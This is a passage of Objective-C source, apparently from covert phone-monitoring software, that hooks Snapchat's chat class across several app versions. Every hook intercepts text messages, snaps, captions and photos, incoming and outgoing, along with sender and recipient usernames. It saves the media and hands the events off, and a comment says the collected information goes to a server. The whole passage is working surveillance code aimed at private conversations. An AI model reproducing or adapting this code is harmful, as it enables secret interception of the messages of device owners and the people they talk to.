        DLog(@"attributes %@", [scText attributes])
        DLog(@"isSending %d",   [scText isSending])
        DLog(@"sender %@",      [scText sender])
        DLog(@"recipient %@",   [scText recipient])
        DLog(@"iterToken %@",   [scText iterToken])
        DLog(@"_id %@",         [scText _id])
        DLog(@"delegate     %@",    [scText delegate])
        DLog(@"messageParameters %@",   [scText messageParameters])
        DLog(@"messageRecipient %@",    [scText messageRecipient])
        DLog(@"messageSender %@",       [scText messageSender])
        
        DLog(@"chatMessage %@",        [scText chatMessage])
        DLog(@"chatMessage chatId %@",  [[scText chatMessage] chatId])
        DLog(@"chatMessage json %@",    [[scText chatMessage] json])
        DLog(@"chatMessage type %@",    [[scText chatMessage] type])
        DLog(@"chatMessage _id %@",     [[scText chatMessage] _id])
        DLog(@"chatMessage delegate %@", [[scText chatMessage] delegate])
        */
    }
    // CASE 2: PHOTO and VIDEO ==========================================================================
    else if ([arg1 isKindOfClass:[$Snap class]]) {
        Snap *snap                          = arg1;
        captionText                         = [snap captionText];
        //printSnap (snap);
        
        DLog (@"Snap %@", snap)
        NSString *consistentID              = [snap consistentId];
        SnapchatGroupUtils *snGroupUtils    = [SnapchatGroupUtils sharedSnapchatGroupUtils];
        DLog(@"&&&&&&&& RECEPIENT COUNT &&&&&&&& %lu",(unsigned long)[[snap recipients] count])
        // -- check first if this is the group chat conversation id or not
        
        if (![self iterToken]                   &&
            [[snap recipients] count] >= 2      ) {    // This is the group chat conversation id
            DLog (@"GROUP CHAT (group consistent id)")
            /*
             This is the example of outgoing group chat:
             1) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1D             --> consistent id of group chat
             2) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1DDEVFOURVVT   --> consistent id of each chat
             3) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1DDEVFIVEVVT   --> consistent id of each chat
             
             No. 1 is the consistent id of group chat. 
                From this call, we will capture the media and caption text
             No. 2 and No. 3 are the consistent id of each chat that belongs to the group chat. 
             
                From this call, we will gather all information to send to server
             Notice that 2 and 3 has the consistent id of 1) as their prefix
             */
            
            mediaPath                       = writeMedia(snap);
            
            [snGroupUtils keepParentConsistentID:consistentID                           // Consistent ID
                                  recipientCount:[[snap recipients] count]              // Recipient Count
                                     captionText:captionText                            // Caption Text
                                       mediaPath:mediaPath];                            // Media Path
        }
        
        else { // This is 1:1 chat or the component of group chat conversation
            DLog (@"1-1 or GROUP CHAT (a consistent id of each member)")
            NSString *recipientUsername     = [snap recipient];
            NSString *recipientDisplayName  = [SnapchatUtils getDisplayNameForUsername:recipientUsername];
            
            // CASE 1: 1-1 Chat
            if ([snap recipients]) {
                DLog (@"1-1 CHAT")
                mediaPath                   = writeMedia(snap);
            }
            // CASE 2: Group Chat
            else {
                DLog (@"GROUP CHAT - each conversation")
                mediaPath                   = [snGroupUtils getMediaPathByChildConsistentID:consistentID];
                if ([mediaPath length] == 0) {
                    mediaPath = writeMedia(snap);
                }
                captionText                 = [snGroupUtils getCaptionTextByChildConsistentID:consistentID];
                
                // -- DECREASE the count of recipients and DELETE if this recipient is the last one
                [snGroupUtils decrementRecipintCountForChildConsistentID:consistentID];
            }
            
            [SnapchatUtils sendOutgoingIMEventForRecipientID:recipientUsername
                                        recipientDisplayName:recipientDisplayName
                                                   mediaPath:mediaPath
                                                 captionText:captionText
                                                    converID:[self conversationId]];
        }
        
    } else if ([arg1 isKindOfClass:$SCChatMedia]) {
        DLog (@"IN/OUT photo from photo album");
        
        SCChatMedia *scChatMedia        = arg1;
        
        // Find direction
        BOOL isSentByUser = NO;
        if ([scChatMedia respondsToSelector:@selector(isSentByUser)]) {
            isSentByUser = [scChatMedia isSentByUser] ;
        } else if ([scChatMedia respondsToSelector:@selector(sentByUser)]) {
            isSentByUser = [scChatMedia sentByUser] ;
        } else {
            DLog(@"Capture Wrong Direction")
        }
        
        FxEventDirection  direction     = isSentByUser ? kEventDirectionOut : kEventDirectionIn;
        
        if (direction == kEventDirectionIn) {
            [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureIncomingSnapchatPhoto:self chatMedia:scChatMedia];
            [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scChatMedia timestamp]];
        } else {
            [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureOutgoingSnapchatPhoto:self chatMedia:scChatMedia];
        }
    }
    
    CALL_ORIG(SCChat, chatDidAddSnapOrMessage$, arg1);
}

#pragma mark - (All outgoing Snap, Text, Photo; all incoming Photo, Text < 9.13.0) text, 9.20.0
// Snapchat 8.0.1, 9.10.0, ... 9.13.0,.. 9.15.0
HOOK(SCChat,  chatDidAddSCMessage$, void, id arg1) {
    DLog(@"&&&&&&&&&&&&&& SCChat --> chatDidAddSCMessage  &&&&&&&&&&&&&&\n\n");
    //DLog(@"arg1 %@", arg1);                                 // SCText for text
    
    @try {
        // Snap for photo
        //DLog(@"mutableMessages %@", [self mutableMessages])
        //DLog(@"draft %@", [self draft])
        //DLog(@"recipientChatTypingState %@", [self recipientChatTypingState])
        //DLog(@"chatTypingState %@", [self chatTypingState])
        //DLog(@"firstMessageToDisplayBelowTheFold %@", [self firstMessageToDisplayBelowTheFold])
        //DLog(@"chatsIterToken %@", [self chatsIterToken])
        //DLog(@"recipientMessageSequences %@", [self recipientMessageSequences])
        //DLog(@"lastReleasedUserSentSnapTimestamp %@", [self lastReleasedUserSentSnapTimestamp])
        //DLog(@"sendingChatMessages %@", [self sendingChatMessages])
        DLog(@"conversationId %@", [self conversationId]);      // devfourvvt~devonevvt1
        DLog(@"iterToken %@", [self iterToken])
        
        Class $SCText                           = objc_getClass("SCText");
        Class $SCChatMedia                      = objc_getClass("SCChatMedia");
        Class $Snap                             = objc_getClass("Snap");
        Class $SCChatMediaMessage = objc_getClass("SCChatMediaMessage"); // 9.15.0 up
        
        // These variables are for photo and video only
        NSString *captionText                   = nil;
        NSString *mediaPath                     = nil;
        
        // CASE 1: TEXT =====================================================================================
        if ([arg1 isKindOfClass:[$SCText class]]) {
            DLog (@"TEXT MESSAGE")
            
            SCText *scText                  = arg1;
            
            // Find direction
            BOOL isSending = NO;
            if ([scText respondsToSelector:@selector(isSending)]) {
                isSending = [scText isSending];
            } else if ([scText respondsToSelector:@selector(sending)]) {
                isSending = [scText sending];
            } else {
                DLog (@"Capture wrong direction")
            }
            
            FxEventDirection  direction     = isSending ? kEventDirectionOut : kEventDirectionIn;
            NSString *messageText           = [scText text];
            DLog(@"text %@",        [scText text])
            if (direction == kEventDirectionIn) {
                NSString *thirdPartyUsername    = [scText sender];
                NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
                DLog(@"3rd party id %@ display name %@", thirdPartyUsername , thirdPartyDisplayName)
                [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
                                            senderDisplayName:thirdPartyDisplayName
                                                  messageText:messageText
                                                     converID:[self conversationId]];
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scText timestamp]];
            } else {
                NSString *thirdPartyUsername   =  [scText recipient];
                NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
                DLog(@"3rd party id %@ display name %@", thirdPartyUsername , thirdPartyDisplayName)
                [SnapchatUtils sendOutgoingIMEventForRecipientID:thirdPartyUsername
                                            recipientDisplayName:thirdPartyDisplayName
                                                     messageText:messageText
                                                        converID:[self conversationId]];
            }
            /*
             DLog(@"attributes %@", [scText attributes])
             DLog(@"isSending %d",   [scText isSending])
             DLog(@"sender %@",      [scText sender])
             DLog(@"recipient %@",   [scText recipient])
             DLog(@"iterToken %@",   [scText iterToken])
             DLog(@"_id %@",         [scText _id])
             DLog(@"delegate     %@",    [scText delegate])
             DLog(@"messageParameters %@",   [scText messageParameters])
             DLog(@"messageRecipient %@",    [scText messageRecipient])
             DLog(@"messageSender %@",       [scText messageSender])
             
             DLog(@"chatMessage %@",        [scText chatMessage])
             DLog(@"chatMessage chatId %@",  [[scText chatMessage] chatId])
             DLog(@"chatMessage json %@",    [[scText chatMessage] json])
             DLog(@"chatMessage type %@",    [[scText chatMessage] type])
             DLog(@"chatMessage _id %@",     [[scText chatMessage] _id])
             DLog(@"chatMessage delegate %@", [[scText chatMessage] delegate])
             */
        }
        // CASE 2: PHOTO and VIDEO ==========================================================================
        else if ([arg1 isKindOfClass:[$Snap class]]) {
            Snap *snap                          = arg1;
            captionText                         = [snap captionText];
            //printSnap (snap);
            
            DLog (@"Snap %@", snap)
            NSString *consistentID              = [snap consistentId];
            SnapchatGroupUtils *snGroupUtils    = [SnapchatGroupUtils sharedSnapchatGroupUtils];
            DLog(@"&&&&&&&& RECEPIENT COUNT &&&&&&&& %lu",(unsigned long)[[snap recipients] count])
            // -- check first if this is the group chat conversation id or not
            
            if (![self iterToken]                   &&
                [[snap recipients] count] >= 2      ) {    // This is the group chat conversation id
                DLog (@"GROUP CHAT (group consistent id)")
                /*
                 This is the example of outgoing group chat:
                 1) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1D             --> consistent id of group chat
                 2) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1DDEVFOURVVT   --> consistent id of each chat
                 3) DEVONEVVT1~FA06D17F-AE87-43C4-81A7-F9CD6F3A0D1DDEVFIVEVVT   --> consistent id of each chat
                 
                 No. 1 is the consistent id of group chat.
                 From this call, we will capture the media and caption text
                 No. 2 and No. 3 are the consistent id of each chat that belongs to the group chat.
                 
                 From this call, we will gather all information to send to server
                 Notice that 2 and 3 has the consistent id of 1) as their prefix
                 */
                
                mediaPath                       = writeMedia(snap);
                
                [snGroupUtils keepParentConsistentID:consistentID                           // Consistent ID
                                      recipientCount:[[snap recipients] count]              // Recipient Count
                                         captionText:captionText                            // Caption Text
                                           mediaPath:mediaPath];                            // Media Path
            }
            
            else { // This is 1:1 chat or the component of group chat conversation
                DLog (@"1-1 or GROUP CHAT (a consistent id of each member)")
                if ([snap recipient]) {
                    NSString *recipientUsername     = [snap recipient];
                    NSString *recipientDisplayName  = [SnapchatUtils getDisplayNameForUsername:recipientUsername];
                    
                    // CASE 1: 1-1 Chat
                    if ([snap recipients]) {
                        DLog (@"1-1 CHAT")
                        mediaPath                   = writeMedia(snap);
                    }
                    // CASE 2: Group Chat
                    else {
                        DLog (@"GROUP CHAT - each conversation")
                        mediaPath                   = [snGroupUtils getMediaPathByChildConsistentID:consistentID];
                        if ([mediaPath length] == 0) {
                            mediaPath = writeMedia(snap);
                        }
                        captionText                 = [snGroupUtils getCaptionTextByChildConsistentID:consistentID];
                        
                        // -- DECREASE the count of recipients and DELETE if this recipient is the last one
                        [snGroupUtils decrementRecipintCountForChildConsistentID:consistentID];
                    }
                    
                    DLog (@"Capture text %@", captionText);
                    
                    NSFileManager *fileManager = [NSFileManager defaultManager];
                    if ([fileManager fileExistsAtPath:mediaPath isDirectory:nil]) {
                        [SnapchatUtils sendOutgoingIMEventForRecipientID:recipientUsername
                                                    recipientDisplayName:recipientDisplayName
                                                               mediaPath:mediaPath
                                                             captionText:captionText
                                                                converID:[self conversationId]];
                    } else {
                        dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
                        dispatch_async(queue, ^(void) {
                            @try {
                                // 9.10.0, 9.15.0
                                int x = 0;
                                while (x++ < 5) {
                                    [NSThread sleepForTimeInterval:2.5];
                                    if ([fileManager fileExistsAtPath:mediaPath isDirectory:nil]) {
                                        DLog (@"Got PHOTO/VIDEO file :)");
                                        [SnapchatUtils sendOutgoingIMEventForRecipientID:recipientUsername
                                                                    recipientDisplayName:recipientDisplayName
                                                                               mediaPath:mediaPath
                                                                             captionText:captionText
                                                                                converID:[self conversationId]];
                                        break;
                                    } else {
                                        DLog(@"Wait for photo/video file to fully save---");
                                    }
                                }
                            }
                            @catch (NSException *exception) {
                                DLog(@"Snapchat exception: %@", exception);
                            }
                            @finally {
                                ;
                            }
                        });
                    }
                } else {
                    // 9.9.0, 9.10.0
                    DLog(@"No recipient because it's an incoming which we don't expect to capture HERE");
                }
            }
            
        }
        else if ([arg1 isKindOfClass:$SCChatMedia] ||
                 [arg1 isKindOfClass:$SCChatMediaMessage]) { // 9.15.0
            DLog (@"IN/OUT photo from photo album");
            
            SCChatMedia *scChatMedia = arg1;
            
            // Find direction
            BOOL isSentByUser = NO;
            if ([scChatMedia respondsToSelector:@selector(isSentByUser)]) {
                isSentByUser = [scChatMedia isSentByUser] ;
            } else if ([scChatMedia respondsToSelector:@selector(sentByUser)]) {
                isSentByUser = [scChatMedia sentByUser] ;
            } else {
                DLog(@"Capture Wrong Direction")
            }
            
            FxEventDirection  direction     = isSentByUser ? kEventDirectionOut : kEventDirectionIn;
            
            if (direction == kEventDirectionIn) {
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureIncomingSnapchatPhoto:self chatMedia:scChatMedia];
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scChatMedia timestamp]];
            } else {
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureOutgoingSnapchatPhoto:self chatMedia:scChatMedia];
                
                // Remove the file capture from sendPressed method
                NSString *mediaPath      = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingPhotoPath] copy];
                DLog(@"Remove media file item, %@", mediaPath)
                [[NSFileManager defaultManager] removeItemAtPath:mediaPath error:NULL];
                [[SnapchatUtils sharedSnapchatUtils] clearOutgoingPhotoPath];
                [mediaPath autorelease];
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat exception: %@", exception);
    }
    @finally {
        ;
    }

    CALL_ORIG(SCChat, chatDidAddSCMessage$, arg1);
}

#pragma mark - Incoming Photo, Text: 9.13.0,9.20.0,9.25.0

/*
 Fail to capture text, photo of conversation of newly added friend. Work around: close Snapchat and restart
 the text, photo of the conversation will be captured.
 */

HOOK(SCChat, deliverMessage$, void, id arg1) {
    DLog(@"&&&&&&&&&&&&&& SCChat --> deliverMessage$  &&&&&&&&&&&&&&\n\n");
    
    //DLog(@"arg1: %@", arg1);
    
    @try {
        DLog(@"conversationId %@", [self conversationId]);      // devfourvvt~devonevvt1
        DLog(@"iterToken %@", [self iterToken])
        
        Class $SCText = objc_getClass("SCText");
        Class $SCChatMedia = objc_getClass("SCChatMedia");
        Class $SCChatMediaMessage = objc_getClass("SCChatMediaMessage"); // 9.15.0
        
        // CASE 1: TEXT =====================================================================================
        if ([arg1 isKindOfClass:[$SCText class]]) {
            DLog (@"TEXT MESSAGE")
            
            SCText *scText = arg1;
            
            // Find direction
            BOOL isSending = NO;
            if ([scText respondsToSelector:@selector(isSending)]) {
                isSending = [scText isSending];
            } else if ([scText respondsToSelector:@selector(sending)]) {
                isSending = [scText sending];
            } else {
                DLog (@"Capture wrong direction")
            }
            
            FxEventDirection  direction = isSending ? kEventDirectionOut : kEventDirectionIn;
            NSString *messageText = [scText text];
            DLog(@"text: %@", [scText text])
            if (direction == kEventDirectionIn) {
                NSString *thirdPartyUsername = [scText sender];
                NSString *thirdPartyDisplayName = [SnapchatUtils getDisplayNameForUsername:thirdPartyUsername];
                DLog(@"3rd party id %@ display name %@", thirdPartyUsername , thirdPartyDisplayName)
                [SnapchatUtils sendIncomingIMEventForSenderID:thirdPartyUsername
                                            senderDisplayName:thirdPartyDisplayName
                                                  messageText:messageText
                                                     converID:[self conversationId]];
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scText timestamp]];
            } else {
                DLog(@"NOT CAPTURE TEXT OUTGOING HERE");
            }
        }
        // CASE 2: PHOTO =====================================================================================
        else if ([arg1 isKindOfClass:$SCChatMedia] ||
                 [arg1 isKindOfClass:$SCChatMediaMessage]) { // 9.15.0
            DLog (@"Interest in incoming photo from photo album");
            
            SCChatMedia *scChatMedia = arg1;
            
            // Find direction
            BOOL isSentByUser = NO;
            if ([scChatMedia respondsToSelector:@selector(isSentByUser)]) {
                isSentByUser = [scChatMedia isSentByUser] ;
            } else if ([scChatMedia respondsToSelector:@selector(sentByUser)]) {
                isSentByUser = [scChatMedia sentByUser];
            } else {
                DLog(@"Cannot detect direction");
            }
            
            FxEventDirection  direction = isSentByUser ? kEventDirectionOut : kEventDirectionIn;
            
            if (direction == kEventDirectionIn) {
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureIncomingSnapchatPhoto:self chatMedia:scChatMedia];
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] saveNewestSCTextChatMediaTimestamp:[scChatMedia timestamp]];
            } else {
                DLog(@"NOT CAPTURE PHOTO OUTGOING HERE");
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat exception: %@", exception);
    }
    @finally {
        ;
    }
    
    CALL_ORIG(SCChat, deliverMessage$, arg1);
}

#pragma mark - Outgoing Photo: 9.20.0
// Can use for outgoing snap, text and incoming snap detection
HOOK(SCChat, chatDidAddMultipleSCMessage$, void, id arg1) {
    DLog(@"--------- arg1: [%@], %@", [arg1 class], arg1);
    
    NSArray *scMessages = arg1;
    Class $SCChatMediaMessage = objc_getClass("SCChatMediaMessage");
    for (id scMessage in scMessages) {
        if ([scMessage isKindOfClass:$SCChatMediaMessage]) {
            DLog (@"Interest in outgoing photo from photo album");
            
            SCChatMedia *scChatMedia = scMessage;
            
            // Find direction
            BOOL isSentByUser = NO;
            if ([scChatMedia respondsToSelector:@selector(isSentByUser)]) {
                isSentByUser = [scChatMedia isSentByUser] ;
            } else if ([scChatMedia respondsToSelector:@selector(sentByUser)]) {
                isSentByUser = [scChatMedia sentByUser];
            } else {
                DLog(@"Cannot detect direction");
            }
            
            FxEventDirection  direction = isSentByUser ? kEventDirectionOut : kEventDirectionIn;
            
            if (direction == kEventDirectionOut) {
                [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureOutgoingSnapchatPhoto:self chatMedia:scChatMedia];
                
                // Remove the file capture from sendPressed method --> Obsolete
                NSString *mediaPath = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingPhotoPath] copy];
                [[NSFileManager defaultManager] removeItemAtPath:mediaPath error:nil];
                [[SnapchatUtils sharedSnapchatUtils] clearOutgoingPhotoPath];
                [mediaPath autorelease];
            } else {
                DLog(@"NOT CAPTURE PHOTO INCOMING HERE (> 9.20.0)");
            }
        }
    }
    CALL_ORIG(SCChat, chatDidAddMultipleSCMessage$, arg1);
}

#pragma mark - Outgoing Photo: 9.25.0
HOOK(SCChat, chatDidAddMultipleSCMessage$shouldUpdateRecent$, void, id arg1, BOOL arg2) {
    DLog(@"--------- arg1: [%@], %@", [arg1 class], arg1);
    
    @try {
        NSArray *scMessages = arg1;
        Class $SCChatMediaMessage = objc_getClass("SCChatMediaMessage");
        for (id scMessage in scMessages) {
            if ([scMessage isKindOfClass:$SCChatMediaMessage]) {
                DLog (@"Interest in outgoing photo from photo album");
                
                SCChatMedia *scChatMedia = scMessage;
                
                // Find direction
                BOOL isSentByUser = NO;
                if ([scChatMedia respondsToSelector:@selector(isSentByUser)]) {
                    isSentByUser = [scChatMedia isSentByUser] ;
                } else if ([scChatMedia respondsToSelector:@selector(sentByUser)]) {
                    isSentByUser = [scChatMedia sentByUser];
                } else {
                    DLog(@"Cannot detect direction");
                }
                
                FxEventDirection  direction = isSentByUser ? kEventDirectionOut : kEventDirectionIn;
                
                if (direction == kEventDirectionOut) {
                    [[SnapchatOfflineUtils sharedSnapchatOfflineUtils] captureOutgoingSnapchatPhoto:self chatMedia:scChatMedia];
                    
                    // Remove the file capture from sendPressed method --> Obsolete
                    NSString *mediaPath = [[[SnapchatUtils sharedSnapchatUtils] mOutgoingPhotoPath] copy];
                    [[NSFileManager defaultManager] removeItemAtPath:mediaPath error:nil];
                    [[SnapchatUtils sharedSnapchatUtils] clearOutgoingPhotoPath];
                    [mediaPath autorelease];
                } else {
                    DLog(@"NOT CAPTURE PHOTO INCOMING HERE (> 9.20.0)");
                }
            }
        }
    }
    @catch (NSException *exception) {
        DLog(@"Snapchat exception: %@", exception);
    }
    @finally {
        ;
    }
    
    CALL_ORIG(SCChat, chatDidAddMultipleSCMessage$shouldUpdateRecent$, arg1, arg2);
}
